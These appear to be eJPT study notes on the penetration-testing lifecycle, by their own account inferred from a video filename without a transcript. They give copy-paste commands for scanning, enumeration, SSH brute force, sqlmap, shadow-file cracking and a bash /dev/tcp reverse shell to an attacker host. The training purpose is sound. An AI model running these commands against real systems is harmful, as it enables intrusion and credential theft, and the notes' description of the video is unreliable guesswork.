# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is a conservative, best-effort summary inferred from the filename “Lifecycle.mp4” and its folder “05-SecurityAuditingProcess.” It likely explains the end-to-end lifecycle of a security audit/pentest engagement aligned with eJPT expectations: from pre-engagement and scoping, through reconnaissance, scanning, enumeration, exploitation, post-exploitation, and reporting, to remediation validation and close-out. It emphasizes methodology, deliverables, and safe/authorized testing.

# Flow (ordered)
1) Authorization and scoping
- Get written authorization, defined scope (in/out), business objectives, timelines, contacts, change windows, and SLAs.
- Agree on Rules of Engagement (ROE): allowed techniques, hours, social engineering limits, DoS restrictions, data handling, safe words/stop conditions, IP whitelisting for egress.

2) Planning and setup
- Build a project workspace and evidence handling plan.
- Define success criteria and test cases mapped to objectives.
- Establish comms plan and emergency contacts.

3) Passive intelligence (OSINT)
- Collect public info about targets: domains, subdomains, technology stacks, emails, public repos, leaked creds, cloud assets, and IP ranges—without touching target infra where possible.

4) Discovery and host identification
- Non-intrusive host discovery on in-scope ranges. Validate live hosts and identify network segmentation or egress limitations.

5) Port scanning and service fingerprinting
- TCP/UDP scans to enumerate open services.
- Version detection, default scripts (NSE), and banner grabs.

6) Enumeration and attack surface mapping
- Service-by-service deep dives (HTTP, SMB, FTP, SNMP, DNS, SSH, databases).
- Content discovery, share enumeration, weak auth checks, misconfigurations.

7) Vulnerability analysis
- Correlate findings with known CVEs/exploits, misconfig patterns, weak creds.
- Prioritize by impact and likelihood; consider chained attack paths.

8) Exploitation
- Exploit validated vulnerabilities to demonstrate impact.
- Maintain least impact and follow ROE. Avoid persistence unless explicitly permitted.

9) Post-exploitation
- Local enumeration, privilege escalation checks, credential harvesting, data access validation, lateral movement (if in-scope).
- Collect evidence of impact (screenshots, hashes, proof files) with minimal data exposure.

10) Containment and cleanup
- Remove test accounts, payloads, tools, and configurations introduced during testing.
- Verify environment stability.

11) Reporting
- Executive summary (business impact), detailed findings (steps, evidence), risk ratings, remediation guidance, and a prioritized action plan.
- Include methodology, scope, and constraints.

12) Remediation support and retest
- Clarify fixes with stakeholders.
- Retest to validate remediation and update the report.

13) Lessons learned and close-out
- Review what worked, what didn’t, and propose process improvements.
- Securely archive or destroy data per agreement.

# Tools highlighted
- Planning/notes/evidence: Obsidian/CherryTree, Markdown, Flameshot/Kazam for screenshots, script/tmux for terminal logging.
- Network discovery/scanning: Nmap, Rustscan (optional), Masscan (use with caution), traceroute, ping/fping.
- DNS/OSINT: whois, dig/host, Amass/Subfinder, theHarvester, GitHub dorking, Google dorking.
- Web enumeration: curl/wget, WhatWeb, httpx, Nikto, Gobuster/dirb/ffuf, wafw00f, sslscan/sslyze.
- Service-specific enum: enum4linux/enum4linux-ng, smbclient, smbmap, rpcclient, snmpwalk/onesixtyone, ftp, smtp-user-enum, ldapsearch (if applicable), showmount.
- Exploitation: searchsploit, Metasploit/msfvenom, sqlmap, Hydra/Medusa, Netcat/socat, Burp Suite Community.
- Credentials: CeWL, Crunch, John the Ripper/Hashcat, rockyou.txt, wordlists.
- Post-exploitation: LinPEAS/WinPEAS, PowerShell, Impacket tools (psexec, wmiexec, smbclient), Mimikatz (if permitted), BloodHound (if AD in-scope).
- Traffic: tcpdump, Wireshark.
- Reporting: CVSS calculators, risk matrices, templates.

# Typical command walkthrough (detailed, copy-paste friendly)
Note: Replace placeholders (PRJ, LHOST, TGT, SUBNET, DOMAIN) as needed.

Setup and workspace
```
PRJ=acme-audit
WK=~/engagements/$PRJ
mkdir -p $WK/{scans,loot,notes,exploits,web,enum}
cd $WK
LHOST=10.10.14.5
TGT=10.10.10.10
SUBNET=10.10.10.0/24
date | tee notes/start.txt
```

Passive intel (if applicable)
```
# WHOIS and DNS records
whois example.com | tee notes/whois.txt
dig any example.com +noall +answer | tee notes/dig-any.txt
dig ns example.com +short | tee notes/dig-ns.txt
```

Host discovery and baseline scans
```
# Ping sweep
nmap -sn $SUBNET -oA scans/ping-sweep
LIVE=$(grep "Status: Up" scans/ping-sweep.gnmap | awk '{print $2}')
echo $LIVE

# Full TCP scan per live host
for H in $LIVE; do
  nmap -p- -sS -T3 -Pn -oA scans/$H-tcp-all $H
done

# Targeted service/version/OS scan on discovered ports
for H in $LIVE; do
  PORTS=$(grep -oP '\d{1,5}/open/tcp' scans/$H-tcp-all.gnmap | cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
  if [ -n "$PORTS" ]; then
    nmap -p $PORTS -sV -sC -O -T3 -Pn -oA scans/$H-tcp-scripts $H
  fi
done
```

HTTP/HTTPS enumeration
```
mkdir -p web/$TGT
whatweb http://$TGT | tee web/$TGT/whatweb.txt
curl -I http://$TGT | tee web/$TGT/headers.txt
gobuster dir -u http://$TGT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 40 -o web/$TGT/gobuster.txt
nikto -h http://$TGT -output web/$TGT/nikto.txt
# If TLS:
sslscan --no-failed $TGT:443 | tee web/$TGT/sslscan.txt
```

SMB enumeration
```
enum4linux -a $TGT | tee enum/$TGT-enum4linux.txt
smbclient -L "//$TGT/" -N | tee enum/$TGT-smb-shares.txt
smbmap -H $TGT | tee enum/$TGT-smbmap.txt
# Try accessing shares if listed:
# smbclient "//$TGT/SHARE" -N
```

FTP, SNMP, DNS checks
```
# FTP anonymous
nmap --script ftp-anon,ftp-syst -p21 $TGT -oN scans/$TGT-ftp-nse.txt
ftp -inv $TGT << 'EOF'
user anonymous anonymous
ls -la
bye
EOF

# SNMP (common default community "public")
snmpwalk -v2c -c public $TGT 1.3.6.1.2.1.1 | tee enum/$TGT-snmp-sysdescr.txt

# DNS zone transfer (if DOMAIN known)
DOMAIN=example.com
for NS in $(dig +short NS $DOMAIN); do
  dig AXFR $DOMAIN @$NS | tee -a enum/$DOMAIN-axfr.txt
done
```

Credential attacks (as permitted)
```
# Build custom wordlist from site content
cewl -d 2 -m 5 http://$TGT -w loot/cewl.txt

# SSH brute force (timebox, respect ROE)
hydra -L users.txt -P passwords.txt -t 4 -I -f ssh://$TGT
```

SQL injection example (if parameter discovered)
```
sqlmap -u "http://$TGT/vuln.php?id=1" --batch --risk=2 --level=2 --dbs -o
```

Search for known exploits
```
# From identified versions in nmap output
searchsploit vsftpd 2.3.4
searchsploit "Apache 2.4" | head
```

Shells and listeners
```
# Netcat listener
rlwrap nc -lvnp 4444

# Linux bash reverse shell (run on target if RCE)
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/4444 0>&1'

# Upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm; stty rows 50 cols 190
```

Local post-exploitation (Linux)
```
id; uname -a; ip a
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
grep -R "password" /var/www -n 2>/dev/null | head
```

Local post-exploitation (Windows)
```
whoami /all
systeminfo
ipconfig /all
wmic qfe get HotFixID,InstalledOn
net user
net localgroup administrators
```

Hash cracking (example)
```
# /etc/shadow + /etc/passwd -> unshadow
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Cleanup (examples)
```
# Remove files created on target (adjust paths)
rm -f /tmp/shell.elf /tmp/.tmpkey
# Clear SMB creds cache on Kali (local)
printf "" > ~/.smb/smb.conf 2>/dev/null || true
```

Reporting
- Capture exact commands used, parameters, timestamps, IPs, and evidence screenshots.
- For each finding: title, description, affected asset, steps to reproduce, impact, evidence, severity (e.g., CVSS), remediation, references.

# Practical tips
- Always get explicit written authorization and a clear scope/ROE before any testing.
- Timebox intrusive actions and throttle scans (e.g., Nmap -T3) during business hours.
- Log everything as you go; script/tmux or tee to files. Screenshot key evidence.
- Prefer safe, non-destructive tests first; avoid DoS; do not persist unless allowed.
- Validate vulnerabilities before exploitation; minimize data exposure during proof-of-concept.
- Use unique markers in payloads to simplify identification and cleanup.
- Keep a findings list updated continuously; map to objectives and business impact.
- Communicate early if you observe instability or high-risk conditions.
- Standardize report templates to reduce rework and improve consistency.
- Retest after remediation; confirm fixes and look for regressions.

# Minimal cheat sheet (one-screen flow)
- Pre-engagement: scope + ROE + authorization + comms plan.
- Setup:
```
PRJ=acme; WK=~/engagements/$PRJ; mkdir -p $WK/{scans,web,enum,loot}; cd $WK
SUBNET=10.10.10.0/24; TGT=10.10.10.10; LHOST=10.10.14.5
```
- Discovery:
```
nmap -sn $SUBNET -oA scans/ping
LIVE=$(grep "Status: Up" scans/ping.gnmap | awk '{print $2}')
```
- Ports:
```
for H in $LIVE; do nmap -p- -sS -T3 -Pn -oA scans/$H-all $H; done
for H in $LIVE; do P=$(grep -oP '\d+/open/tcp' scans/$H-all.gnmap|cut -d/ -f1|tr '\n' ','|sed 's/,$//'); [ -n "$P" ] && nmap -p $P -sV -sC -O -Pn -oA scans/$H-scripts $H; done
```
- Web:
```
whatweb http://$TGT | tee web/$TGT-whatweb.txt
gobuster dir -u http://$TGT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o web/$TGT-gobuster.txt
nikto -h http://$TGT -output web/$TGT-nikto.txt
```
- SMB/FTP/SNMP:
```
enum4linux -a $TGT | tee enum/$TGT-e4l.txt
smbmap -H $TGT | tee enum/$TGT-smbmap.txt
nmap --script ftp-anon -p21 $TGT -oN scans/$TGT-ftp.txt
snmpwalk -v2c -c public $TGT 1.3.6.1.2.1.1 | tee enum/$TGT-snmp.txt
```
- Exploit:
```
searchsploit <service/version>
rlwrap nc -lvnp 4444  # listener
# Use RCE to run: bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/4444 0>&1'
```
- Post-exploit:
```
id; uname -a; sudo -l; find / -perm -4000 -type f 2>/dev/null
```
- Reporting: document steps, evidence, severity, remediation. Cleanup artifacts.

# Summary
Lifecycle.mp4 (Security Auditing Process) likely outlines the full audit/pentest lifecycle: define and authorize scope; plan and set up; gather passive intel; discover hosts; scan and enumerate services; analyze and prioritize vulnerabilities; exploit safely to demonstrate impact; perform post-exploitation checks; clean up; report with actionable remediation; and retest to validate fixes. The notes above provide a pragmatic, eJPT-aligned flow with ready-to-run commands, common tools per phase, and practical tips to execute a professional, safe, and well-documented engagement from kickoff to close-out.